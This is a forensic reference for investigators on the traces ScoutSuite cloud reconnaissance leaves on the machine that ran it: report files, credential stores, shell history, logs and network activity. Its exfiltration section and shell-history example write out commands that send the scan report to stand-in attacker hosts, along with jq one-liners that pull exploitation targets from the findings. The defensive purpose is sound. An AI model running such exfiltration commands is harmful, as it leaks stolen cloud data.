# ScoutSuite — Source Evidence

**Scope:** Artifacts and forensic indicators on the **attacker's/source host** (the machine running ScoutSuite). This covers what DFIR analysts should look for when examining a potentially-compromised attacker machine, a red-team operator's workstation, or evidence of reconnaissance activities.

---

## Output Directory Structure

When ScoutSuite completes an audit, it creates a hierarchical output directory with the following structure:

```
./scoutsuite-report/ (or -report-dir <directory> specified)
├── scoutsuite-report.html          # Main interactive HTML report (self-contained)
├── scoutsuite-findings.json        # Machine-readable findings (JSON array)
├── config.txt                      # Command-line arguments used (audit trail)
├── database.db                     # Optional SQLite database of findings
└── [optional: backup/ directory containing historical snapshots]
```

### scoutsuite-report.html — The primary output artifact

**What it contains:**
- **Dashboard summary:**
  - Pie chart of findings by severity (CRITICAL, HIGH, MEDIUM, LOW, INFO)
  - Timestamp of scan start/end
  - Cloud provider(s) scanned (AWS, Azure, GCP)
  - Total resources enumerated
- **Findings table:** Searchable, sortable list with:
  - Rule ID and name
  - Severity level
  - Affected resource(s)
  - Description
  - Remediation steps
  - Links to affected resource (e.g., EC2 instance ID)
- **Services breakdown:** Per-service (EC2, S3, IAM, etc.) tabs with findings per service
- **Configuration tab:** Raw enumerated cloud configuration data (searchable, read-only)
- **Navigation:** Cloud provider selector at top; findings filterable by severity, service, or keyword
- **Client-side JavaScript:** All data embedded; no external dependencies or server required

**Forensic value:**
- **Timeline indicator:** HTML metadata and timestamps indicate scan start/end times
- **Target identification:** Cloud provider and resource types reveal reconnaissance scope
- **Finding details:** Exactly what was discovered (public buckets, security group rules, IAM policies, etc.)
- **Exfiltration artifact:** Report.html alone is sufficient to reconstruct the entire audit; attacker often copies this to C2 or exfiltrates for offline review
- **Proof of reconnaissance:** The report is definitive proof that ScoutSuite was run against a specific cloud environment at a specific time

**File metadata:**
- **Modification time:** Indicates when the scan was completed
- **File size:** Typically 500 KB – 5 MB depending on number of findings
- **Embedded data:** All resources (CSS, JavaScript, JSON data) are embedded; file is self-contained and can be opened offline

### scoutsuite-findings.json — Machine-readable findings export

**What it contains:**
```json
{
  "cloud": "aws",
  "regions": ["us-east-1", "us-west-2", "eu-west-1"],
  "account_id": "123456789012",
  "scan_start": "2026-08-11T10:30:00Z",
  "scan_end": "2026-08-11T10:45:30Z",
  "findings": [
    {
      "rule_id": "s3-bucket-public-read",
      "rule_name": "S3 Bucket Public Read",
      "service": "s3",
      "severity": "HIGH",
      "resource_id": "prod-backups-2026",
      "resource_type": "s3_bucket",
      "region": "us-east-1",
      "description": "S3 bucket allows public-read via ACL or bucket policy",
      "remediation": "Set bucket ACL to private; restrict bucket policy",
      "evidence": {
        "acl": "public-read",
        "bucket_policy": "null"
      }
    },
    {
      "rule_id": "ec2-security-group-unrestricted-ssh",
      "rule_name": "EC2 Security Group Unrestricted SSH",
      "service": "ec2",
      "severity": "CRITICAL",
      "resource_id": "sg-0123456789abcdef0",
      "resource_type": "security_group",
      "region": "us-east-1",
      "description": "Security group allows SSH (port 22) from 0.0.0.0/0",
      "remediation": "Restrict inbound SSH to specific CIDR blocks",
      "evidence": {
        "rules": [
          {
            "protocol": "tcp",
            "from_port": 22,
            "to_port": 22,
            "cidr": "0.0.0.0/0"
          }
        ]
      }
    }
  ]
}
```

**Forensic value:**
- **Structured query capability:** Analysts can parse JSON and query findings programmatically
- **Timeline data:** `scan_start` and `scan_end` indicate when audit was performed
- **Scope data:** `cloud`, `regions`, and `account_id` reveal what was scanned
- **Evidence details:** Rule-specific evidence (ACL values, security group rules, IAM policies) show exactly what triggered each finding
- **Severity distribution:** Can be aggregated to determine risk profile at time of scan

### config.txt — Command-line audit trail

**What it contains:**
```
ScoutSuite Audit Configuration
==============================
Command: scout aws --report-dir ./scoutsuite-report
Cloud Provider: AWS
Regions: us-east-1, us-west-2, eu-west-1
Authentication Method: AWS CLI (default credentials)
Profile Used: default
Custom Rules: None
Skip Default Rules: False
Scan Timestamp: 2026-08-11T10:30:00Z
```

**Forensic value:**
- **Authentication method:** Reveals which identity/credentials were used (AWS profile, Azure account, etc.)
- **Scope:** Indicates which regions/subscriptions/projects were audited
- **Configuration choices:** Shows whether custom rules were applied, default rules skipped, etc.
- **Timing:** Exact start time of the audit

### database.db (optional SQLite database)

**Schema (example for AWS):**
```sql
CREATE TABLE findings (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    rule_id TEXT,
    rule_name TEXT,
    service TEXT,
    severity TEXT,
    resource_id TEXT,
    resource_type TEXT,
    region TEXT,
    description TEXT,
    remediation TEXT,
    scan_timestamp DATETIME,
    evidence TEXT  -- JSON blob of rule-specific evidence
);

CREATE TABLE resources (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    resource_id TEXT,
    resource_type TEXT,
    service TEXT,
    region TEXT,
    configuration TEXT,  -- Raw JSON of resource config
    scan_timestamp DATETIME
);
```

**Forensic value:**
- **Historical tracking:** Allows comparison between multiple audit runs
- **Trend analysis:** Can identify new findings vs. persistent findings over time
- **Query capability:** Analysts can query for resources by service, region, or finding type
- **Audit trail:** Database records provide immutable record of what was found and when

---

## Cloud Provider API Artifacts

### Python process execution

**Process name:** `python` or `python3` (parent: shell or cron)

**Command-line evidence (via `ps` or process forensics):**
```bash
python -m scout.main aws --report-dir ./scoutsuite-report
# OR
python /path/to/scout.py azure --cli --report-dir ./scoutsuite-report
```

**Forensic indicators:**
- Running `ps aux | grep scout` will reveal ScoutSuite process during execution
- Process resource usage: ScoutSuite is multi-threaded; will consume 2–8 CPU cores and 200 MB – 1 GB RAM depending on cloud size
- Process lifetime: Typically runs for 5–30 minutes depending on cloud size and number of rules

### Cloud credentials storage

**Where credentials are sourced (and where forensic evidence may exist):**

**AWS:**
- **Credentials file:** `~/.aws/credentials` (AWS CLI config)
  - Format: INI file with `aws_access_key_id` and `aws_secret_access_key`
  - Forensic value: Shows which AWS accounts/profiles were accessed
  - Modification time: Indicates when credentials were last configured
- **EC2 instance role:** If ScoutSuite runs on an EC2 instance, credentials come from the instance role (no file; credentials obtained from instance metadata service)
  - Forensic indicator: Presence of ScoutSuite on an EC2 instance itself is suspicious
- **Environment variables:** AWS CLI can read credentials from `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` environment variables
  - Forensic indicator: Bash history may contain export statements with embedded credentials

**Azure:**
- **Azure CLI cache:** `~/.azure/` directory
  - Subdirectories: `accessTokens/`, `profiles/`, `cloud_config`
  - Forensic value: Shows which Azure tenants/subscriptions were logged into
  - Tokens are JSON files with expiration times
- **Service principal credentials:** If `--file-auth` is used, attacker may have a credentials JSON file (e.g., from `az ad sp create-for-rbac --sdk-auth`)
  - File content: Contains client_id, client_secret, tenant_id
  - Forensic value: High; this file should not normally exist on an attacker's machine
- **Environment variables:** `AZURE_SUBSCRIPTION_ID`, `AZURE_TENANT_ID`, `AZURE_CLIENT_ID`, `AZURE_CLIENT_SECRET`
  - Forensic indicator: .bashrc, .zshrc, or other shell init files may contain these

**GCP:**
- **gcloud CLI config:** `~/.config/gcloud/`
  - Subdirectories: `properties`, `authorized_user.json`, `service-account-*.json`
  - Forensic value: Shows which GCP projects were authenticated to
  - authorized_user.json contains OAuth tokens; service-account-*.json contains service account credentials
- **Service account key file:** Often stored as `~/.gcp/key.json` or similar
  - Forensic indicator: Presence of service account JSON file is high-confidence evidence of GCP reconnaissance
  - File content: Contains type, project_id, private_key_id, private_key, client_email, etc.

### Network traffic artifacts

**Outbound connections (visible in network logs, firewall logs, or packet captures):**

During ScoutSuite execution, the attacker's machine initiates HTTPS connections to:
- **AWS:** api.aws.amazon.com, *.amazonaws.com (port 443)
- **Azure:** management.azure.com, graph.microsoft.com, login.microsoftonline.com (port 443)
- **GCP:** cloudresourcemanager.googleapis.com, compute.googleapis.com (port 443)

**Characteristics of ScoutSuite network traffic:**
- **Protocol:** TLS 1.2 or 1.3 with standard certificate chains (AWS, Microsoft, Google)
- **Source:** Attacker's IP address
- **Timing:** Rapid-fire API calls (hundreds to thousands of requests) over 5–30 minute period
- **Request patterns:** Describe* (AWS), List* (Azure/GCP), Get* operations (read-only)
- **User-Agent:** Python requests library default user-agent or boto3/azure-sdk user-agent
- **Packet size:** Variable; API responses range from 500 bytes to 100 KB depending on resource size

**Forensic collection methods:**
- Network packet captures (PCAP files): Firewall logs showing destination IPs/ports and number of connections
- Proxy logs (if traffic is inspected): Will show API calls to cloud providers
- DNS queries: DNS lookups for `*.amazonaws.com`, `management.azure.com`, `googleapis.com` domains

---

## Filesystem Artifacts

### ScoutSuite installation directory

**Location of source code (if cloned from GitHub):**
```
~/ScoutSuite/                       # or /opt/scoutsuite/, /home/attacker/.local, etc.
├── scout.py                        # Main entry point
├── requirements.txt                # Dependencies
├── README.md
├── scoutsuite/                     # Python package
│   ├── __init__.py
│   ├── core/                       # Core logic
│   ├── providers/                  # Cloud provider adapters (aws.py, azure.py, gcp.py)
│   └── rules/                      # Rulesets
│       ├── aws_cis_*.json          # CIS Benchmark rules for AWS
│       ├── azure_cis_*.json        # CIS Benchmark rules for Azure
│       └── gcp_cis_*.json          # CIS Benchmark rules for GCP
└── .git/                           # Git repository metadata (if cloned)
```

**Forensic value:**
- **Repository history:** `git log` shows commit history; `.git/` directory contains full history of changes
- **Remote origin:** `git config --get remote.origin.url` shows where the repo was cloned from
- **Rules version:** JSON files in `scoutsuite/rules/` show which CIS Benchmark versions are installed
- **Modification times:** Installation date and last modification time

### Python virtual environment artifacts

**Location (if using venv):**
```
~/scoutsuite-venv/                  # or similar
├── bin/
│   ├── python
│   ├── pip
│   └── scout                       # ScoutSuite executable
├── lib/
│   └── python3.9/site-packages/    # Installed dependencies
│       ├── boto3/                  # AWS SDK
│       ├── azure/                  # Azure SDK
│       ├── google-cloud-*/         # GCP SDKs
│       └── scoutsuite/             # ScoutSuite package
└── pyvenv.cfg                      # Virtual environment configuration
```

**Forensic value:**
- **Timestamp:** Directory creation time indicates when venv was created
- **Dependencies:** Presence of boto3, azure-cli-core, google-cloud libraries confirms cloud reconnaissance intent
- **Modification times:** Package modification times show when dependencies were last updated

### Shell history artifacts

**Bash history (`~/.bash_history` or `~/.zsh_history`):**
```bash
# Evidence of ScoutSuite execution
scout aws --report-dir ./aws-audit-results
cat aws-audit-results/scoutsuite-findings.json | jq '.findings | length'
scout azure --cli --subscriptions "Production"
scout gcp --user-account --projects "prod-project-123"

# Evidence of credential configuration
aws configure --profile prod
az login --service-principal -u <client_id> -p <client_secret> --tenant <tenant_id>
gcloud auth login

# Evidence of result analysis
cat scoutsuite-findings.json | jq '.findings | map(select(.severity == "CRITICAL"))'
scp aws-audit-results/scoutsuite-report.html attacker-c2.com:/backups/
```

**Forensic value:**
- **Complete audit trail:** Shell history shows exact commands run, arguments, and output directory locations
- **Timeline:** Timestamps on history entries (if enabled: `export HISTTIMEFORMAT='%F %T '`) show when audit was performed
- **Scope:** Command arguments reveal which cloud providers, regions, and accounts were targeted
- **Exfiltration evidence:** `scp`, `curl`, or `aws s3 cp` commands in history show data movement after audit

### Temporary files

**Potential temporary file locations:**
- `/tmp/.scoutsuite-*` — Temporary directories created by ScoutSuite for caching
- `/tmp/scout-*` — Temporary CSV/JSON exports
- `~/.cache/scout-*` — Cached cloud configuration data
- System temp directory (`%TEMP%` on Windows, `/tmp` on Linux)

**Forensic value:**
- **Partial data recovery:** If ScoutSuite process crashes or is interrupted, temp files may contain partial enumeration results
- **Timing:** File creation/modification times indicate when audit was in progress
- **Cleanup effort:** Absence of temp files suggests attacker cleaned up after themselves

---

## Log File Artifacts

### ScoutSuite debug logs

**If run with `--debug` flag:**
```bash
scout aws --debug --logfile ./scout-debug.log
```

**Content example:**
```
[2026-08-11 10:30:15] DEBUG: Starting AWS reconnaissance
[2026-08-11 10:30:16] DEBUG: Authenticating to AWS with profile 'default'
[2026-08-11 10:30:17] DEBUG: Enumerating EC2 instances in us-east-1
[2026-08-11 10:30:18] DEBUG: Found 23 instances
[2026-08-11 10:30:19] DEBUG: Enumerating S3 buckets
[2026-08-11 10:30:22] DEBUG: Found 15 buckets
[2026-08-11 10:30:23] DEBUG: Enumerating IAM users
[2026-08-11 10:30:25] DEBUG: Found 47 users
[2026-08-11 10:30:26] DEBUG: Evaluating 523 security rules
[2026-08-11 10:30:45] DEBUG: Scan complete; 37 findings generated
```

**Forensic value:**
- **Detailed execution log:** Shows every step of the audit, including resources enumerated
- **Timing:** Precise timestamps show how long enumeration took for each service
- **Error messages:** If errors occurred (insufficient permissions, API rate limiting, etc.), they are logged
- **Rule evaluation:** Shows which rules were evaluated and how many findings were generated

### Application logs (if ScoutSuite is containerized)

**Docker container logs:**
```bash
docker logs scout-container | grep -i "scout\|error"
```

**Kubernetes pod logs:**
```bash
kubectl logs scout-pod -n security
```

**Forensic value:**
- **Containerization evidence:** Presence of container logs indicates ScoutSuite was run in a containerized environment
- **Container parameters:** Image name, environment variables, mounted volumes may reveal reconnaissance parameters

---

## Data Exfiltration Artifacts

### Report copies

**If attacker copies the report to a C2 server or external storage:**
- **SCP transfer:** `scp ./scoutsuite-report.html attacker@c2.example.com:/data/`
- **SFTP transfer:** FTP logs on the C2 server
- **curl upload:** `curl -X POST -F "file=@scoutsuite-report.html" http://c2.example.com/upload`
- **AWS S3 upload:** `aws s3 cp scoutsuite-report.html s3://attacker-bucket/reconnaissances/`

**Forensic evidence:**
- Shell history shows the exfiltration command
- Network logs show data leaving the network
- C2 server logs (if accessible) show file receipt

### Findings extract for exploitation

**If attacker creates a CSV or script list from findings for follow-up exploitation:**
```bash
# Extract public S3 bucket names
jq -r '.findings[] | select(.rule_id == "s3-bucket-public-read") | .resource_id' \
  scoutsuite-findings.json > public-s3-buckets.txt

# Extract security group IDs with unrestricted SSH
jq -r '.findings[] | select(.rule_name | contains("SSH")) | .resource_id' \
  scoutsuite-findings.json > vuln-sgs.txt

# Extract IAM users with high privileges
jq -r '.findings[] | select(.rule_name | contains("admin")) | .resource_id' \
  scoutsuite-findings.json > high-priv-users.txt
```

**Forensic evidence:**
- Extracted files in the output directory
- Shell history showing `jq` or similar parsing commands
- Proof that findings were analyzed for exploitation (next-stage attack tools referencing these lists)

---

## Summary of High-Confidence Forensic Indicators

| Artifact | Location | Forensic Weight | Indicator |
|---|---|---|---|
| scoutsuite-report.html | `./scoutsuite-report/` | **CRITICAL** | Definitive proof of cloud reconnaissance |
| scoutsuite-findings.json | `./scoutsuite-report/` | **CRITICAL** | Machine-readable findings; attack planning artifact |
| AWS credentials file | `~/.aws/credentials` | **HIGH** | Accessing AWS; targeted account IDs in file |
| Azure tokens | `~/.azure/accessTokens/` | **HIGH** | Accessing Azure tenants; subscription IDs in tokens |
| GCP service account key | `~/.gcp/key.json` or env vars | **HIGH** | Accessing GCP; project IDs in key file |
| Shell history | `~/.bash_history`, `~/.zsh_history` | **HIGH** | Complete audit trail; cloud provider commands |
| ScoutSuite install dir | `~/ScoutSuite/`, `~/.local/`, `/opt/` | **HIGH** | Tool installation; ruleset versions indicate age |
| Cloud API network traffic | Firewall/proxy logs | **MEDIUM** | High-volume API calls to AWS/Azure/GCP APIs |
| Temporary files | `/tmp/scout-*`, `~/.cache/` | **MEDIUM** | Partial data; indicates interrupted audits |
| Debug logs | `./scout-debug.log` (if `--debug` used) | **MEDIUM** | Detailed execution log; resource enumeration proof |

